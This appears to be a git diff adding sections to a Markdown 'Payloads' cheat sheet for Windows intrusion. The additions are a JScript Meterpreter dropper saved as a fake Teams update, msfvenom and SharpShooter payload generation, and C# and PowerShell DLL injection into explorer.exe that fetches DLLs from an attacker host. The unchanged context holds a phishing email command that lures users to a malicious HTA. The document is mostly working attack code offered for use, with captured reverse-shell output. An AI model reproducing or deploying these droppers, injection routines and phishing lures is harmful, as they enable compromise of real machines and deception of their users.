@@ -1,8 +1,11 @@
 # Payloads
 
 * [Bypass MS Defender](#bypass-ms-defender)
-* [Reverse Shell MS Word Macro (Detected)](#reverse-shell-ms-word-macro-detected) 
+* [Reverse Shell MS Word Macro (Detected)](#reverse-shell-ms-word-macro-detected)
+* [Basic JScript Meterpreter Dropper](#basic-jscript-meterpreter-dropper)
 * [C# Phishing Payload with HTA and JScript](#csharp-payload-with-hta-and-jscript)
+* [SharpShooter Raw Meterpreter Payload](#sharpshooter-raw-meterpreter-payload)
+* [Reflective DLL Injection in PowerShell](#reflective-dll-injection-in-powershell)
 
 # Bypass MS Defender 
 
@@ -76,7 +79,35 @@ Sub AutoOpen()
 End Sub
 ```
 
-# C# Payload with HTA and JScript
+# Basic JScript Meterpreter Dropper
+
+>  Complete Jscript code to download and execute Meterpreter shell. Save as TeamsUpdate.js.
+
+```js
+var url = "http://kali/met.exe"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+
+Object.Open('GET', url, false);
+Object.Send();
+
+if (Object.Status == 200)
+{
+
+    var Stream = WScript.CreateObject('ADODB.Stream');
+
+    Stream.Open();
+    Stream.Type = 1;
+    Stream.Write(Object.ResponseBody);
+    Stream.Position = 0;
+
+    Stream.SaveToFile("met.exe", 2);
+    Stream.Close();
+}
+
+var r = new ActiveXObject("WScript.Shell").Run("met.exe");
+```
+
+# C# Phishing Payload with HTA and JScript
 
 > Create a C# payload with MSFVenom
 
@@ -124,3 +155,107 @@ run
 sendemail -f administrator@domain.com -t jose@domain.com -s 192.168.0.203 -u "URGENT - Important Teams Update" -m "Please click on this link to update Teams - http://192.168.0.203/teamsHTA.hta"
 ```
 
+# SharpShooter Raw Meterpreter Payload
+
+> Install SharpShooter
+
+```shell
+git clone https://github.com/mdsecactivebreach/SharpShooter.git
+pip install -r requirements.txt
+```
+
+> Create a raw Meterpreter staged payload. If you want to obfuscate it, use shellcodeCrypter-msfvenom.py.
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=kali LPORT=443 -f raw -o shell.txt
+```
+
+> Generating malicious Jscript file with SharpShooter
+
+```shell
+python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
+```
+
+# Reflective DLL Injection in PowerShell
+
+> Generate Meterpreter.dll shellcode.
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=kali LPORT=443 -f dll -o met.dll
+```
+
+> Create a remote thread with argument
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+namespace Inject {
+    class Program {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
+            SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        static void Main(string[] args) {
+            String dir =
+                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            String dllName = dir + "\\met.dll";
+            WebClient wc = new WebClient();
+            wc.DownloadFile("http://kali/met.dll", dllName);
+            Process[] expProc = Process.GetProcessesByName("explorer");
+            int pid = expProc[0].Id;
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr outSize;
+            Boolean res = WriteProcessMemory(hProcess, addr,
+                Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
+                "LoadLibraryA");
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
+                addr, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+
+> Download the DLL and finding Explorer.exe process ID
+
+```powershell
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://kali/met.dll')
+$procid = (Get-Process -Name explorer).Id
+```
+
+> Import [Invoke-ReflectivePEInjection.ps1](https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1). 
+
+```powershell
+Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
+```
+
+> Execute Invoke-ReflectivePEInjection
+
+```powershell
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+> Getting a reverse shell
+
+```
+msf6 exploit(multi/handler) > run
+[*] Started HTTPS reverse handler on https://192.168.119.120:443
+[*] https://192.168.0.203:443 handling request from 192.168.0.59; (UUID: pm1qmw8u)
+Staging x64 payload (207449 bytes) ...
+[*] Meterpreter session 1 opened (192.168.0.203:443 -> 192.168.0.59:49678)
+meterpreter >
+```
